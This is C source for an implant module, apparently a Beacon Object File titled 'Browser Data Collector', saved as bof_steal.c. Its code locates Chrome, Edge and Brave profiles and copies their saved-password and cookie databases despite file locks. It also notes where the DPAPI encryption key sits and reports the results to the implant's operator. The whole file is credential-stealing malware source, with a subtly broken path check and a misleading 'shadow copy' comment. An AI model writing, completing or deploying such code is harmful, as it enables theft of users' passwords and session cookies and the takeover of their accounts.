/*
 * ARES BOF — Browser Data Collector (Lightweight)
 * Collects: Chrome/Edge saved passwords + cookies (SQLite DB copy)
 * Works WITHOUT Chrome injection — just reads DB files directly.
 * 
 * Compile: gcc -c -o bof_steal.o bof_steal.c
 */

#include <windows.h>
#include <stdio.h>
#include <shlobj.h>

void BeaconPrintf(int type, const char* fmt, ...);
void BeaconOutput(int type, const char* data, int len);
#define CALLBACK_OUTPUT 0

/* Find browser profile paths */
static int _find_profiles(char profiles[][512], int max)
{
    int count = 0;
    char localAppData[MAX_PATH];
    if (!SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))
        return 0;

    /* Chrome + Edge + Brave profile paths */
    const char* browsers[] = {
        "Google\\Chrome\\User Data",
        "Microsoft\\Edge\\User Data",
        "BraveSoftware\\Brave-Browser\\User Data",
        NULL
    };

    for (int b = 0; browsers[b] && count < max; b++) {
        char base[512];
        snprintf(base, sizeof(base), "%s\\%s", localAppData, browsers[b]);

        /* Check Default profile */
        char test[600];
        snprintf(test, sizeof(test), "%s\\Default\\Login Data", base);
        if (GetFileAttributesA(test) != INVALID_FILE_ATTRIBUTES) {
            strncpy(profiles[count++], base, 511);
        }
    }
    return count;
}

/* Copy a locked DB file (Chrome locks it while running) */
static BOOL _copy_locked(const char* src, const char* dst)
{
    /* Try direct copy first */
    if (CopyFileA(src, dst, FALSE))
        return TRUE;

    /* If locked, use shadow copy via CreateFile + ReadFile */
    HANDLE hSrc = CreateFileA(src, GENERIC_READ, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hSrc == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hDst = CreateFileA(dst, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hDst == INVALID_HANDLE_VALUE) { CloseHandle(hSrc); return FALSE; }

    char buf[65536];
    DWORD rd, wr;
    while (ReadFile(hSrc, buf, sizeof(buf), &rd, NULL) && rd > 0)
        WriteFile(hDst, buf, rd, &wr, NULL);

    CloseHandle(hDst);
    CloseHandle(hSrc);
    return TRUE;
}

void go(char* args, int alen)
{
    char output[32768] = {0};
    int n = 0;

    char profiles[8][512];
    int prof_count = _find_profiles(profiles, 8);

    n += snprintf(output + n, sizeof(output) - n,
        "[BROWSER STEAL]\nFound %d browser profile(s)\n\n", prof_count);

    char tmpDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpDir);

    for (int i = 0; i < prof_count && n < (int)sizeof(output) - 1024; i++) {
        n += snprintf(output + n, sizeof(output) - n, "Profile: %s\n", profiles[i]);

        /* Profiles to check */
        const char* subprofiles[] = {"Default", "Profile 1", "Profile 2", NULL};

        for (int sp = 0; subprofiles[sp]; sp++) {
            /* Login Data (passwords) */
            char loginSrc[600], loginDst[600];
            snprintf(loginSrc, sizeof(loginSrc), "%s\\%s\\Login Data", profiles[i], subprofiles[sp]);
            snprintf(loginDst, sizeof(loginDst), "%s\\ld_%d_%d.tmp", tmpDir, i, sp);

            if (GetFileAttributesA(loginSrc) != INVALID_FILE_ATTRIBUTES) {
                if (_copy_locked(loginSrc, loginDst)) {
                    HANDLE h = CreateFileA(loginDst, GENERIC_READ, FILE_SHARE_READ, 
                        NULL, OPEN_EXISTING, 0, NULL);
                    if (h != INVALID_HANDLE_VALUE) {
                        DWORD sz = GetFileSize(h, NULL);
                        n += snprintf(output + n, sizeof(output) - n,
                            "  [%s] Login Data: %lu bytes (copied)\n", subprofiles[sp], sz);
                        CloseHandle(h);
                    }
                    DeleteFileA(loginDst); /* Clean up */
                } else {
                    n += snprintf(output + n, sizeof(output) - n,
                        "  [%s] Login Data: LOCKED/DENIED\n", subprofiles[sp]);
                }
            }

            /* Cookies */
            char cookieSrc[600], cookieDst[600];
            snprintf(cookieSrc, sizeof(cookieSrc), "%s\\%s\\Network\\Cookies", profiles[i], subprofiles[sp]);
            snprintf(cookieDst, sizeof(cookieDst), "%s\\ck_%d_%d.tmp", tmpDir, i, sp);

            if (GetFileAttributesA(cookieSrc) != INVALID_FILE_ATTRIBUTES) {
                if (_copy_locked(cookieSrc, cookieDst)) {
                    HANDLE h = CreateFileA(cookieDst, GENERIC_READ, FILE_SHARE_READ,
                        NULL, OPEN_EXISTING, 0, NULL);
                    if (h != INVALID_HANDLE_VALUE) {
                        DWORD sz = GetFileSize(h, NULL);
                        n += snprintf(output + n, sizeof(output) - n,
                            "  [%s] Cookies: %lu bytes (copied)\n", subprofiles[sp], sz);
                        CloseHandle(h);
                    }
                    DeleteFileA(cookieDst);
                }
            }

            /* Local State (encryption key) */
            char stateSrc[600];
            snprintf(stateSrc, sizeof(stateSrc), "%s\\Local State", profiles[i]);
            if (sp == 0 && GetFileAttributesA(stateSrc) != INVALID_FILE_ATTRIBUTES) {
                n += snprintf(output + n, sizeof(output) - n,
                    "  Local State: present (contains DPAPI key)\n");
            }
        }
        n += snprintf(output + n, sizeof(output) - n, "\n");
    }

    if (prof_count == 0) {
        n += snprintf(output + n, sizeof(output) - n,
            "No Chromium browsers found in AppData\n");
    }

    BeaconOutput(CALLBACK_OUTPUT, output, n);
}
